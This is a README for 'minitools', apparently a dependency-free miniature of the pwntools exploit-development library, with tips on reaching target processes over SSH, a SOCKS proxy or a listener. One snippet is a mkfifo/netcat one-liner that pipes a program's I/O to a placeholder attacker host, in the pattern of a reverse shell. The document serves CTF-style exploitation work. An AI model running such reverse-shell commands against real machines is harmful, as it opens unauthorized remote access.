# minitools
A minimal version of pwntools that requires no external libraries


# PLEASE DON'T USE THIS IF YOU DON'T HAVE TO!!!
I'f you've found this repository, I imagine it's because you want to use pwntools on a machine that has limited or no external internet access.
This repository *can* work as a solution, but treat it as a final option-- this only contains the code for process communication and packing. No ELF parsing, no ROP generation etc etc.

If you can connect to the machine over SSH, you're in luck. Ignore this repository:
```python
conn = ssh('blah', 'server.com', password='password')
p = conn.process("/home/blah/pwn.elf") # attack a local process
p = conn.remote("172.16.45.9",9001) # attack a remote server (through the connection)
# continue exploit as normal
```
If SSH is disabled, you can try setting up a SOCKS proxy (if you need to attack an internal server):
```python
context.proxy = (2,'172.16.45.9',1081) # 2 for SOCKS5, 1 for SOCKS4
# remote() will now connect through the proxy
```
Or, in extreme cases, you can send the vulnerable program over reverse-shell style:
```python
# on your solve script
s = server(8888)
info("Waiting for connection on port 8888...")
p = s.next_connection() 
# continue exploit as normal
```
```bash
# on the internal machine
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|./vulnerable_program 2>&1|nc <your-server-ip> 8888 >/tmp/f
```

If none of those work, or you need this for some other reason, welcome to my incredibly hacky solution. 
